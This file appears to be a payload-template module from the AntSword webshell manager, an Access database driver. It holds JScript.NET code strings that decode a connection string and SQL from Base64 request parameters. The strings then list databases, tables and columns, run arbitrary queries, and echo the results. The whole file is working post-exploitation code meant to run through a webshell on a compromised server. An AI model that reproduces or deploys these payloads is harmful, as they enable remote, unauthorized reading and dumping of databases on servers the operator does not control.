/**
 * access数据库驱动代码模板
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _:
      `var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));Response.Write(Request.Item["${arg2}"]+"\\t");Conn.Close();`,
    [arg1]: '#{base64::conn}',
    [arg2]: '#{dbname}'
  },
  // 显示数据库所有表
  show_tables: {
    _:
      `var Conn=new ActiveXObject("Adodb.connection");Conn.ConnectionString=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));Conn.ConnectionTimeout=10;Conn.Open();var Rs=Conn.OpenSchema(20);var x:String="";while(!Rs.EOF && !Rs.BOF){if(Rs.Fields(3).Value=="TABLE"){x+=Rs.Fields(2).Value+"\\t";}Rs.MoveNext();}Rs.Close();Conn.Close();Response.Write(x);`,
    [arg1]: '#{base64::conn}',
  },
  // 显示表字段
  show_columns: {
    _:
      `function TN(n:Int32):String{switch(n){case 2:return "smallint";case 3:return "int";case 4:return "real";case 5:return "float";case 6:return "money";case 7:return "datetime";case 11:return "bit";case 12:return "variant";case 16:return "tinyint";case 17:return "tinyint";case 20:return "bigint";case 72:return "unique";case 128:return "binary";case 129:return "char";case 130:return "nchar";case 131:return "numeric";case 135:return "datetime";case 200:return "varchar";case 201:return "text";case 202:return "nvarchar";case 203:return "ntext";case 204:return "varbinary";case 205:return "image";default:return n;}}var Conn=new ActiveXObject("Adodb.connection");Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));var Rs=new ActiveXObject("ADODB.Recordset");Rs.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"])),Conn,1,1);var c:Int32;for(c=0;c<=Rs.Fields.Count-1;c++){Response.Write(Rs.Fields.Item(c).Name+" ("+TN(Rs.Fields.Item(c).Type)+")\\t");}Rs.Close();Conn.Close();`,
    [arg1]: '#{base64::conn}',
    // SELECT TOP 1 * FROM table2
    [arg2]: '#{base64::table}'
  },
  // 执行SQL语句
  query: {
    _:
      `var Conn=new ActiveXObject("Adodb.connection");var strSQL:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));Conn.ConnectionString=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));Conn.ConnectionTimeout=10;Conn.Open();var CO:String="\\t|\\t",RN:String="\\r\\n",Dat:String;var Rs=Conn.Execute(strSQL);var i:Int32=Rs.Fields.Count,c:Int32;for(c=0;c<i;c++){Response.Write(Rs.Fields(c).Name+CO);}Response.Write(RN);while(!Rs.EOF && !Rs.BOF){for(c=0;c<i;c++){Dat=Rs.Fields(c).Value;Response.Write(Dat);Response.Write(CO);}Response.Write(RN);Rs.MoveNext();}Conn.Close();`,
    [arg1]: '#{base64::conn}',
    [arg2]: '#{base64::sql}',
  }
})
